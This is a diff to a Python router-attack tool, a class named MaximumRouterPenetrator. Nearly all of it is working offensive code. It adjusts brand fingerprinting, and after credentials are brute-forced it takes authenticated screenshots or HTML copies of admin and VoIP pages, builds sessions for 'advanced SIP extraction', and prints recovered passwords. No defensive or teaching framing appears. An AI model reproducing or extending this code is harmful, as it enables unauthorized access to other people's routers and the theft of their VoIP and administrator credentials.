@@ -1306,7 +1306,8 @@ class MaximumRouterPenetrator:
                         for pwd in hidden_passwords['passwords']:
                             print(f"         🔓 {pwd['field_name']}: {pwd['password']} ({pwd['method']})")
             
-            # RouterPassView style extraction moved to Phase 6 (Config File Extraction)
+            # RouterPassView style extraction is now in Phase 6 (Config File Extraction)
+            # Phase 3 focuses on DOM manipulation and encrypted password extraction
             
             # Encrypted password extraction from page content
             if auth_result.get('verified_access') and self.password_extraction['encrypted_field_decryption']:
@@ -1835,12 +1836,12 @@ class MaximumRouterPenetrator:
                         
                         # Brand detection based on headers
                         brand_indicators = {
-                            'cisco': ['cisco', 'ios', 'catalyst', 'asr', 'isr'],
-                            'netgear': ['netgear', 'genie', 'nighthawk'],
-                            'tplink': ['tplink', 'tp-link', 'archer'],
-                            'dlink': ['dlink', 'd-link', 'dir'],
-                            'linksys': ['linksys', 'smart', 'wrt'],
-                            'asus': ['asus', 'asuswrt', 'merlin'],
+                            'cisco': ['cisco', 'ios', 'catalyst', 'asr', 'isr', 'cisco-systems'],
+                            'netgear': ['netgear', 'genie', 'nighthawk', 'netgear-inc'],
+                            'tplink': ['tplink', 'tp-link', 'archer', 'tp-link-technologies'],
+                            'dlink': ['dlink', 'd-link', 'dir', 'd-link-corporation'],
+                            'linksys': ['linksys', 'smart', 'wrt', 'linksys-systems'],
+                            'asus': ['asus', 'asuswrt', 'merlin', 'asus-tek-computer'],
                             'huawei': ['huawei', 'hg', 'ont'],
                             'zyxel': ['zyxel', 'zywall'],
                             'fortinet': ['fortinet', 'fortigate'],
@@ -1855,15 +1856,33 @@ class MaximumRouterPenetrator:
                             score = 0
                             for indicator in indicators:
                                 if indicator in server_header:
-                                    score += 3
+                                    score += 5  # Increased weight for server header
                                 if indicator in www_auth:
-                                    score += 2
+                                    score += 4  # Increased weight for WWW-Authenticate
                                 if indicator in content.lower():
-                                    score += 1
+                                    score += 2  # Increased weight for content
                             
                             if score > max_score:
                                 max_score = score
                                 detected_brand = brand
+                        
+                        # Additional realm analysis for brand detection
+                        if 'realm=' in www_auth:
+                            try:
+                                realm = www_auth.split('realm=')[1].split(',')[0].strip('"').lower()
+                                if verbose:
+                                    print(f"         🔍 LIVE DEBUG: Authentication realm: {realm}")
+                                
+                                for brand, indicators in brand_indicators.items():
+                                    for indicator in indicators:
+                                        if indicator in realm:
+                                            max_score += 2
+                                            detected_brand = brand
+                                            if verbose:
+                                                print(f"         🏷️ LIVE DEBUG: Brand indicator in realm: {indicator}")
+                                            break
+                            except:
+                                pass
                         
                         if max_score > 0:
                             router_info['brand'] = detected_brand
@@ -2397,24 +2416,98 @@ class MaximumRouterPenetrator:
                         print(f"            🎯 LIVE DEBUG: Working credential: {username}:{password}")
                         print(f"            📊 LIVE DEBUG: Verification score: {verification['score']}")
                     
-                    # CAPTURE LIGHTWEIGHT SCREENSHOT EVIDENCE FOR POC (if enabled)
-                    if self.screenshot_mode and self.screenshot_system['screenshot_config']['enabled']:
-                        # Skip if already found access and skip_on_success is enabled
-                        if not (self.screenshot_system['screenshot_config']['skip_on_success'] and auth_result.get('verified_access')):
-                            screenshot_evidence = self._capture_screenshot_evidence(ip, (username, password), auth_result.get('session'), verbose)
-                            if screenshot_evidence['success']:
-                                auth_result['screenshot_evidence'] = screenshot_evidence
+                    # CAPTURE SCREENSHOTS IMMEDIATELY AFTER VERIFICATION
+                    if self.screenshot_mode:
+                        if verbose:
+                            print(f"            📸 LIVE DEBUG: Taking immediate screenshots after verification...")
+                        
+                        # Admin panel screenshot
+                        admin_screenshot = self._take_selenium_screenshot(
+                            ip, 
+                            "/admin/", 
+                            f"admin_panel_{ip}.png",
+                            (username, password),
+                            verbose
+                        )
+                        
+                        if admin_screenshot['success']:
+                            auth_result['admin_screenshot'] = admin_screenshot['filename']
+                            if verbose:
+                                print(f"            ✅ Admin panel screenshot: {admin_screenshot['filename']}")
+                        else:
+                            # Fallback to HTML save
+                            try:
+                                import base64
+                                auth_string = f'{username}:{password}'
+                                auth_bytes = auth_string.encode('ascii')
+                                auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                                
+                                req = urllib.request.Request(f"http://{ip}/admin/")
+                                req.add_header('Authorization', f'Basic {auth_b64}')
+                                response = urllib.request.urlopen(req, timeout=10)
+                                
+                                html_filename = f"admin_panel_{ip}.html"
+                                with open(html_filename, 'w', encoding='utf-8') as f:
+                                    f.write(response.read().decode('utf-8', errors='ignore'))
+                                
+                                auth_result['admin_screenshot'] = html_filename
                                 if verbose:
-                                    print(f"            📸 LIVE DEBUG: PoC evidence captured: {len(screenshot_evidence['screenshots_captured'])} screenshots")
-                    elif verbose and self.screenshot_mode:
+                                    print(f"            ✅ Admin panel HTML saved: {html_filename}")
+                            except Exception as e:
+                                if verbose:
+                                    print(f"            ❌ Screenshot fallback error: {str(e)[:50]}")
+                        
+                        # VoIP/SIP page screenshot
+                        voip_screenshot = self._take_selenium_screenshot(
+                            ip, 
+                            "/admin/voip.asp", 
+                            f"voip_page_{ip}.png",
+                            (username, password),
+                            verbose
+                        )
+                        
+                        if voip_screenshot['success']:
+                            auth_result['voip_screenshot'] = voip_screenshot['filename']
+                            if verbose:
+                                print(f"            ✅ VoIP page screenshot: {voip_screenshot['filename']}")
+                        else:
+                            # Try other VoIP paths
+                            voip_paths = ["/voip.html", "/sip.html", "/voice.html", "/admin/sip.asp"]
+                            for path in voip_paths:
+                                voip_test = self._take_selenium_screenshot(
+                                    ip, path, f"voip_page_{ip}.png", (username, password), verbose
+                                )
+                                if voip_test['success']:
+                                    auth_result['voip_screenshot'] = voip_test['filename']
+                                    if verbose:
+                                        print(f"            ✅ VoIP screenshot from {path}: {voip_test['filename']}")
+                                    break
+                    elif verbose:
                         print(f"            📸 LIVE DEBUG: Screenshot mode disabled for maximum speed")
                     
                     # PERFORM ADVANCED SIP EXTRACTION AFTER SUCCESSFUL LOGIN
                     if verbose:
                         print(f"            📞 LIVE DEBUG: Performing advanced SIP extraction...")
                     
+                    # Use the session we just created
+                    session_for_sip = auth_result.get('session')
+                    if not session_for_sip and REQUESTS_AVAILABLE:
+                        try:
+                            session_for_sip = requests.Session()
+                            session_for_sip.auth = (username, password)
+                            session_for_sip.verify = False
+                            # Test the session
+                            test_resp = session_for_sip.get(f"http://{ip}/admin/", timeout=10)
+                            if test_resp.status_code in (200, 302, 301, 403):
+                                auth_result['session'] = session_for_sip
+                                if verbose:
+                                    print(f"            ✅ LIVE DEBUG: Created session for SIP extraction")
+                        except Exception as e:
+                            if verbose:
+                                print(f"            ❌ LIVE DEBUG: Session creation for SIP failed: {str(e)[:50]}")
+                    
                     sip_extraction_result = self._perform_advanced_sip_extraction(
-                        ip, auth_result.get('session'), router_info.get('brand', 'unknown'), verbose
+                        ip, session_for_sip, router_info.get('brand', 'unknown'), verbose
                     )
                     
                     if sip_extraction_result['success']:
